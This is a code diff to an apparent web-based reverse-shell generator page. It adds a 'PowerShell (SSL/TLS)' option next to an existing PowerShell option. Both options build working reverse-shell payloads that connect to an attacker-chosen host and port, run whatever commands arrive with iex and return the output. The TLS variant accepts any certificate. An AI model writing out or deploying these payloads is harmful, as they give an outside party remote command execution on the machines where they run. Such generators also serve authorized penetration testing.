@@ -451,6 +451,13 @@ layout: "post"
             res_raw = "$c=New-Object Net.Sockets.TCPClient(\"" + lhost + "\"," + lport + ");\n$s=$c.GetStream();\n[byte[]]$b=0..65535|%{0};\nwhile(($i=$s.Read($b, 0, $b.Length)) -ne 0)\n{\n\t$d=(New-Object -t Text.ASCIIEncoding).GetString($b,0,$i-1);\n\tif($d -eq \"exit\"){break}\n\t$sb=if($i -gt 1) {try {iex \"$d 2>&1\" | Out-String} catch {$_ | Out-string}} else{\"\"};\n\t$sb2=$sb+\"PS \"+(pwd).Path+\"> \";\n\t$sdb=([text.encoding]::ASCII).GetBytes($sb2)\n\t$s.Write($sdb,0,$sdb.Length);\n\t$s.Flush()\n};\n$c.Close()";
             res_oneliner = "# No one-liner for this payload";
             res_encoded = encodePowerShell(res_raw);
+        } else if (sl == "psh_ssl") {
+            res_raw_hljs = "powershell";
+            res_oneliner_hljs = "powershell";
+            res_encoded_hljs = "powershell";
+            res_raw = "$c=New-Object Net.Sockets.TcpClient(\"" + lhost + "\"," + lport + ")\n$s=$c.GetStream()\n$ss=New-Object Net.Security.SslStream($s,$False,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$ss.AuthenticateAsClient(\"foo.tld\",$Null,\"Tls12\",$False)\n$w=New-Object IO.StreamWriter($ss)\n$w.Write(\"PS \"+(pwd).Path+\"> \")\n$w.Flush()\n[byte[]]$b=0..65535|%{0}\nwhile(($i=$ss.Read($b,0,$b.Length)) -ne 0){\n    $d=(New-Object -TypeName Text.UTF8Encoding).GetString($b,0,$i)\n    $sb=(iex $d | Out-String) 2>&1\n    $sb2=$sb+\"PS \"+(pwd).Path+\"> \"\n    $sb=([Text.Encoding]::UTF8).GetBytes($sb2)\n    $ss.Write($sb,0,$sb.Length)\n    $ss.Flush()\n}\n$c.Close()"
+            res_oneliner = "# No one-liner for this payload";
+            res_encoded = encodePowerShell(res_raw);
         } else if (sl == "psh_powersploit") {
             res_raw_hljs = "powershell";
             res_oneliner_hljs = "powershell";
@@ -538,6 +545,7 @@ layout: "post"
     Language:
     <select id="rs_select_language" style="width:200px" onchange="updateCommandOutput()">
         <option value="psh">PowerShell</option>
+        <option value="psh_ssl">PowerShell (SSL/TLS)</option>
         <option value="psh_powersploit">PowerShell (PowerSploit)</option>
         <option value="psh_powercat">PowerShell (Powercat)</option>
         <option value="bash">Bash</option>
